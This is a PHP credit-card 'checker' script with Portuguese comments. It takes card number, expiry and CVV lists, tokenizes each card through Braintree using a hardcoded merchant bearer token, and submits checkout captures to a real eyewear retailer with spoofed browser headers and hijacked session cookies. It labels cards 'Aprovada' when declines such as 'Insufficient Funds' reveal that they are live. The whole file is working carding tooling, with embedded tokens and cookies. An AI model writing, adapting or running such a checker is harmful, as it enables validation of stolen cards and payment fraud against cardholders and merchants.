<?php
error_reporting(1);
set_time_limit(0);
date_default_timezone_set('America/Sao_Paulo');

$start_time = microtime(true); // Tempo inicial

$email = 'cyberang'.rand(10, 100000).'%40gmail.com';
$useragent = "Mozilla/5.0 (Windows NT " . rand(6, 10) . ".0; Win64; x64) AppleWebKit/" . rand(500, 600) . ".0 (KHTML, like Gecko) Chrome/" . rand(100, 120) . ".0." . rand(4000, 5000) . "." . rand(100, 300) . " Safari/" . rand(500, 600) . ".0";

function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$lista = $_GET['lista'];
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$mes2 = (string)((int)$mes);
$ano = $separar[2];
$ano2 = substr($ano, -2);
$cvv = $separar[3];

if (file_exists("cybergang.txt")) {
    unlink("cyberang.txt");
}

$digito = substr($cc, 0, 1);
if($digito == 4){
  $brand = 'visa';
}elseif($digito == 5){
  $brand = 'mastercard';
}elseif($digito == 2){
  $brand = 'mastercard';
}elseif($digito == 6){
  $brand = 'elo';
}elseif($digito == 3){
  $brand = 'amex';
}else{
  $brand = 'unknown';
}

function cyber($icone, $status, $lista, $mensagem, $cor = "#00ff84", $cormsg = "#ffffff") {
  $bg = $cor === "#00ff84" ? "rgba(0, 255, 132, 0.03)" : "rgba(255, 51, 102, 0.03)";
  echo "<div style='
      font-family: \"JetBrains Mono\", \"Courier New\", monospace;
      background: linear-gradient(90deg, $bg 0%, rgba(10, 10, 10, 0) 100%);
      border-left: 2px solid $cor;
      padding: 14px 18px;
      margin: 4px 0;
      border-radius: 0 6px 6px 0;
      letter-spacing: 0.3px;
      font-size: 12.5px;
      box-shadow: 0 0 20px $bg;
  '>
      <span style='color: $cor; margin-right: 4px;'>$icone</span>
      <span style='color: $cor; font-weight: 500; margin-right: 4px;'>#$status</span>
      <span style='color: #8f9199; margin: 0 4px;'>↝</span>
      <span style='color: #ffffff; background: rgba(255, 255, 255, 0.03); padding: 3px 6px; border-radius: 4px;'>[$lista]</span>
      <span style='color: #8f9199; margin: 0 4px;'>↝</span>
      <span style='color: $cormsg;'>$mensagem</span>
      <span style='color: #8f9199; margin-left: 4px;'>cyberang</span>
  </div>";
}

// ========== ETAPA 1: TOKENIZAÇÃO NO BRAINTREE ==========

$braintree_token_time = microtime(true);

// Token de autorização (pode precisar ser atualizado periodicamente)
$authorization_token = "eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NzA4Mzk4MDEsImp0aSI6ImQxZjVjOGI3LTBkZTctNDA2YS1iN2ZmLTc5MTE4NDM1YWY5MCIsInN1YiI6Im05dGZiODR5ZDRoOXo2M3QiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im05dGZiODR5ZDRoOXo2M3QiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7InBheXBhbF9jbGllbnRfaWQiOiJBVkZoMWRoZHZ3NTh6a2hnNnN2cFlVQ2RuRmxUOExDVkJGWVFDMEIwOGRjNGdfMFM2WDFzdEJBeHRKOUZvVGZNZFY1VnQ1Y19Dd19tRDN4UiJ9fQ.gfZEUFCYZ024-5Y53V69ZVNRJdz2_lZQwS5QzaY44ZFZOJbHNvbNJreNnfgUm88-CBWlxxyQ9YQKmm_l2JQeGQ";

// Session ID para a requisição
$session_id = "1d2d634d-386f-433a-87ad-9ae76e3b2aff";

// Montar o payload para tokenização
$braintree_payload = json_encode([
    "clientSdkMetadata" => [
        "source" => "client",
        "integration" => "custom",
        "sessionId" => $session_id
    ],
    "query" => "mutation TokenizeCreditCard(\$input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: \$input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
    "variables" => [
        "input" => [
            "creditCard" => [
                "number" => $cc,
                "expirationMonth" => $mes2,
                "expirationYear" => $ano,
                "cvv" => $cvv,
                "cardholderName" => "cyber sec"
            ],
            "options" => [
                "validate" => false
            ]
        ]
    ],
    "operationName" => "TokenizeCreditCard"
]);

$braintree_ch = curl_init();
curl_setopt($braintree_ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($braintree_ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($braintree_ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($braintree_ch, CURLOPT_HTTPHEADER, [
    'Host: payments.braintree-api.com',
    'sec-ch-ua-platform: "Windows"',
    'authorization: Bearer ' . $authorization_token,
    'braintree-version: 2018-05-10',
    'user-agent: ' . $useragent,
    'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
    'content-type: application/json',
    'sec-ch-ua-mobile: ?0',
    'accept: */*',
    'origin: https://assets.braintreegateway.com',
    'sec-fetch-site: cross-site',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://assets.braintreegateway.com/',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'priority: u=1, i',
]);
curl_setopt($braintree_ch, CURLOPT_POSTFIELDS, $braintree_payload);
curl_setopt($braintree_ch, CURLOPT_ENCODING, 'gzip');

$braintree_response = curl_exec($braintree_ch);
$braintree_http_code = curl_getinfo($braintree_ch, CURLINFO_HTTP_CODE);
curl_close($braintree_ch);

$braintree_token_time_end = microtime(true);
$braintree_time = round(($braintree_token_time_end - $braintree_token_time) * 1000);

// Extrair o token do cartão da resposta do Braintree
$payment_method_nonce = 'tokencc_bc_3gfv2w_m2kmdf_9m2m65_cgwy62_n72'; // Valor padrão de fallback

if ($braintree_response !== false && !empty($braintree_response)) {
    $braintree_data = json_decode($braintree_response, true);
    if (isset($braintree_data['data']['tokenizeCreditCard']['token'])) {
        $payment_method_nonce = $braintree_data['data']['tokenizeCreditCard']['token'];
        $braintree_status = "Token gerado com sucesso";
    } else {
        $braintree_status = "Falha na tokenização";
        if (isset($braintree_data['errors'][0]['message'])) {
            $braintree_status .= ": " . $braintree_data['errors'][0]['message'];
        }
    }
} else {
    $braintree_status = "Erro na requisição Braintree";
}

// ========== ETAPA 2: REQUISIÇÃO PARA O SITE ==========

$site_time = microtime(true);

// Primeira requisição para obter tokens e cookies
$init_ch = curl_init();
curl_setopt($init_ch, CURLOPT_URL, 'https://www.39dollarglasses.com/ord/checkout/c72c89e3-1091-4b39-942a-e86cc02fdce7');
curl_setopt($init_ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($init_ch, CURLOPT_HEADER, true);
curl_setopt($init_ch, CURLOPT_HTTPHEADER, [
    'Host: www.39dollarglasses.com',
    'User-Agent: ' . $useragent,
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Encoding: gzip, deflate, br',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: none',
    'Sec-Fetch-User: ?1',
]);
curl_setopt($init_ch, CURLOPT_COOKIEJAR, 'cookies.txt');
curl_setopt($init_ch, CURLOPT_COOKIEFILE, 'cookies.txt');

$init_response = curl_exec($init_ch);
$init_info = curl_getinfo($init_ch);
curl_close($init_ch);

// Extrair CSRF token da resposta inicial
$csrf_token = '';
$xsrf_token = '';
$session_cookie = '';

if ($init_response) {
    // Extrair CSRF token
    if (preg_match('/<meta name="csrf-token" content="([^"]+)"/', $init_response, $matches)) {
        $csrf_token = $matches[1];
    }
    
    // Ler cookies do arquivo
    if (file_exists('cookies.txt')) {
        $cookies_content = file_get_contents('cookies.txt');
        if (preg_match('/XSRF-TOKEN\s+([^\s]+)/', $cookies_content, $matches)) {
            $xsrf_token = $matches[1];
        }
        if (preg_match('/39dollarglasses_session\s+([^\s]+)/', $cookies_content, $matches)) {
            $session_cookie = $matches[1];
        }
    }
}

// Valores de fallback caso não consiga extrair tokens
if (empty($csrf_token)) {
    $csrf_token = 'kUiopSoN6mQxWsSRavVCrpxZ9hWLqiP8STfn3631';
}
if (empty($xsrf_token)) {
    $xsrf_token = 'eyJpdiI6ImFNUWJxUGtIakorb3paRjhYejZuVWc9PSIsInZhbHVlIjoiVmw4b2NDZGFFNVhWMEMxOTRib2FlUW1NREg4WnNpS1Jlb3IyZEIvcXphZGtyeUdiTjczV1Vac3RlcCtRRmVadDFxdkdGb1JoRWFnZFFTanFHOVJoS0FlRkRrdnhMbHFUVHZFVFB6N0NReDBpY3FabTE2blJUR251RjlXNmJRNlkiLCJtYWMiOiI4MWJmNTM3Y2E4MzhjNjJiOTVkN2E1NzgyYjFhYTA5Y2NjYzg0YjcwY2JhMmI1ZTkxNGIxMjQ5YjFjMDRlODE4In0=';
}
if (empty($session_cookie)) {
    $session_cookie = 'eyJpdiI6IktYNnpudVNaTzZEZDBSeXF5a3hScFE9PSIsInZhbHVlIjoiVFBGTzVmdDlJU2VySW0vakZMa2ttS2tReG9VZUhiTTNBN1VkUG0wWnY5VExDdHkrK1drYU0xWk00ek5VLzVuaTlKQkpyc2ExUE1vRDdxUXNmOVdNOHpCbTRZWWFNdWdlMGFQeFdCR1RGM004a2JiLzI5UVlxaSszR05aMldNN2UiLCJtYWMiOiIzMjM3MTBlNWM3MzNjN2YyM2VjY2NlMjI4Y2I3YjUyNDA2MjI3ZWNiMDY3OWZjNzUzNDU2YmI3MDcyZmU3OWU5In0%3D';
}

// Construir string de cookies para a requisição principal
$cookies_string = sprintf(
    '__kla_id=eyJjaWQiOiJOalE1WW1RME1HSXRaVEEzT0MwME9HWTFMVGxtWkRNdFltVmtabVF5TlRJNFlXSXcifQ==; cf_clearance=9Zi1.F1QKGdjsa25LgTSzinsAwnVBQlmuvnp8Kap6vM-1770753330-1.2.1.1-hsRfXXKIq.DX4HEPcSLTHCxG1sprl5VBh5iZdZepF7CZgVQl4HWxE0V4YsvGNlBhvQgspE.MbVixYUoKsYj8GThZSNgAfiSsu.I52m.pXciPHqfQzwUt4rmNGeV_KiUoazdFOAeDZ7Ek7B4fIfYyW.rUK.1yzMeu_UoTZrAp9AE4MMJ4QNcEXRVhwl3QVRcQnJtngq9SBgIq85YQOGtEKzialRmssoC_tBNSiE6n6g4; cookieyes-consent=consentid:WXBaVjZ5bHQzVWZ6Q0NYU1VzcVh4aThJcUV5cW5neDI,consent:yes,action:no,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; apt_pixel=eyJkZXZpY2VJZCI6ImM1ODRhMGZkLTYwNzQtNGQyNy1hMDIzLTg0OTE0Y2Y1Mzk4MCIsInVzZXJJZCI6bnVsbCwiZXZlbnRJZCI6MywibGFzdEV2ZW50VGltZSI6MTc3MDc1MzM1MTg1MSwiY2hlY2tvdXQiOnsiYnJhbmQiOiJjYXNoYXBwYWZ0ZXJwYXkifX0=; amp_f24a38=x5FjsSnxvt6ML2MT-YyWxd...1jh4hvl0i.1jh4hvo5m.0.0.0; _gcl_au=1.1.795245817.1770753353; _gid=GA1.2.416586704.1770753354; ATRK_a=c71ce2d9cdc349a9976e62eb5db6e318.1; ATRK_t=1; _clck=1rn7a3g%%5E2%%5Eg3g%%5E0%%5E2232; _tt_enable_cookie=1; _ttp=01KH4HZVRYACNZBMSY53JVEDS6_.tt.1; _fbp=fb.1.1770753355650.224385285654343468; g_state={"i_l":1,"i_ll":1770753392630,"i_b":"vcb1pIXKZfbJ0LFeUbLa4F9KrUARKuSGXhSx8m25lMk","i_e":{"enable_itp_optimization":15},"i_p":1770760532266}; ATRK_y=3; _ga_W863F3ENMJ=GS2.1.s1770753354; _ga=GA1.1.2069026132.1770753354; _uetsid=82982c8006ba11f1b7d4f774da711d37; _uetvid=82988f7006ba11f1bccf912e3f827e9c; _clsk=1bvsvs9%%5E1770753405127%%5E3%%5E1%%5Ed.clarity.ms%%2Fcollect; _ga_RZ7NG2LJSJ=GS2.1.s1770753354; XSRF-TOKEN=%s; 39dollarglasses_session=%s; ttcsid=1770753355563::MNAnW2hae1VRBtHIF937.1.1770753551865.0; ttcsid_C9KO4HJC77U5A68B84H0=1770753355561::pP2fM8p7O3y8XotCbuEb.1.1770753551865.1',
    $xsrf_token,
    $session_cookie
);

// Requisição principal de captura
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.39dollarglasses.com/ord/checkout/capture/c72c89e3-1091-4b39-942a-e86cc02fdce7');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.39dollarglasses.com',
    'User-Agent: ' . $useragent,
    'sec-ch-ua-platform: "Windows"',
    'x-csrf-token: ' . $csrf_token,
    'x-xsrf-token: ' . $xsrf_token,
    'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
    'sec-ch-ua-mobile: ?0',
    'x-requested-with: XMLHttpRequest',
    'origin: https://www.39dollarglasses.com',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://www.39dollarglasses.com/ord/checkout/c72c89e3-1091-4b39-942a-e86cc02fdce7',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'priority: u=1, i',
    'Accept-Encoding: gzip',
    'Content-Type: application/json',
]);
curl_setopt($ch, CURLOPT_COOKIE, $cookies_string);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
    "gateway" => "Braintree\\HostedFields",
    "payment_method_nonce" => $payment_method_nonce,
    "email" => "cybersecofc@gmail.com",
    "shipping_fname" => "cyber",
    "shipping_lname" => "sec",
    "shipping_address" => "cyber jessy",
    "shipping_address2" => "",
    "shipping_country" => "US",
    "shipping_city" => "new york",
    "shipping_state" => "AL",
    "shipping_zipcode" => "10100",
    "billing_fname" => "",
    "billing_lname" => "",
    "billing_address" => "",
    "billing_address2" => "",
    "billing_country" => "",
    "billing_city" => "",
    "billing_state" => "",
    "billing_zipcode" => "",
    "shipping_option_id" => 15,
    "mobile_phone" => "3155555858845",
    "home_phone" => "31987462541",
    "save_payment_method" => false,
    "same_as_shipping" => true,
    "auth" => false,
    "phone_error" => "",
    "patients_name" => null,
    "patients_dob" => null
]));

$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

$site_time_end = microtime(true);
$site_time = round(($site_time_end - $site_time) * 1000);

// ========== ETAPA 3: PROCESSAMENTO DA RESPOSTA ==========

$end_time = microtime(true);
$total_execution_time = round(($end_time - $start_time) * 1000);

// Processar resposta
$gate_response = "Erro Desconhecido";
$is_live = false;

if($response !== false && !empty($response)) {
    // Primeiro tentar extrair JSON
    if (preg_match('/\{.*\}/s', $response, $json_matches)) {
        $json_response = json_decode($json_matches[0], true);
        if ($json_response) {
            if (isset($json_response['error'])) {
                $gate_response = $json_response['error'];
                if (isset($json_response['security'])) {
                    $gate_response .= " | security: " . ($json_response['security'] ? 'true' : 'false');
                }
                
                // VERIFICAÇÕES PARA LIVE (APROVADA)
                if (strpos($gate_response, 'Card Issuer Declined CVV') !== false) {
                    $is_live = true;
                    $gate_response = 'Card Issuer Declined CVV';
                }
                if (strpos($gate_response, 'Insufficient Funds') !== false) {
                    $is_live = true;
                    $gate_response = 'Insufficient Funds';
                }
                
            } elseif (isset($json_response['message'])) {
                $gate_response = $json_response['message'];
                
                // VERIFICAÇÕES PARA LIVE (APROVADA)
                if (strpos($gate_response, 'Card Issuer Declined CVV') !== false) {
                    $is_live = true;
                    $gate_response = 'Card Issuer Declined CVV';
                }
                if (strpos($gate_response, 'Insufficient Funds') !== false) {
                    $is_live = true;
                    $gate_response = 'Insufficient Funds';
                }
                
            } elseif (isset($json_response['success']) && $json_response['success'] === true) {
                $gate_response = 'success';
                $is_live = true;
            } else {
                $gate_response = substr($response, 0, 150);
            }
        } else {
            $gate_response = substr($response, 0, 150);
        }
    }
    // Verificar por erros específicos
    elseif(preg_match('/"message":"(.+?)"/', $response, $matches)) {
        $gate_response = $matches[1];
        
        // VERIFICAÇÕES PARA LIVE (APROVADA)
        if (strpos($gate_response, 'Card Issuer Declined CVV') !== false) {
            $is_live = true;
            $gate_response = 'Card Issuer Declined CVV';
        }
        if (strpos($gate_response, 'Insufficient Funds') !== false) {
            $is_live = true;
            $gate_response = 'Insufficient Funds';
        }
        
    }
    // Verificações diretas na resposta
    elseif(strpos($response, 'Card Issuer Declined CVV') !== false) {
        $gate_response = 'Card Issuer Declined CVV';
        $is_live = true; // AGORA É LIVE
    }
    elseif(strpos($response, 'Insufficient Funds') !== false) {
        $gate_response = 'Insufficient Funds';
        $is_live = true; // AGORA É LIVE
    }
    // Outros erros que permanecem como reprovados
    elseif(strpos($response, 'Processor Declined') !== false) {
        $gate_response = 'Processor Declined';
    }
    elseif(strpos($response, 'Do Not Honor') !== false) {
        $gate_response = 'Do Not Honor';
    }
    // Para respostas de sucesso
    elseif(strpos($response, 'success') !== false || strpos($response, '"success":true') !== false) {
        $gate_response = 'success';
        $is_live = true;
    }
    else {
        // Tentar extrair qualquer texto relevante
        $gate_response = strip_tags($response);
        $gate_response = substr($gate_response, 0, 100);
        if (strlen($gate_response) < 10) {
            $gate_response = "Resposta não reconhecida";
        }
    }
} else {
    $gate_response = "Falha na requisição ou resposta vazia | HTTP: $http_code";
}

// Adicionar informações de tempo ao resultado
$time_info = "⏱️ Total: {$total_execution_time}ms (Braintree: {$braintree_time}ms | Site: {$site_time}ms)";

// Determinar status final
if($is_live) {
    cyber("💸", "Aprovada", $lista, "[ $gate_response ] - $time_info");
} else {
    cyber("❌", "Reprovada", $lista, "[ $gate_response ] - $time_info", "#ff3366", "#ff3366");
}

// Limpar arquivo de cookies após uso
if (file_exists('cookies.txt')) {
    unlink('cookies.txt');
}
?>
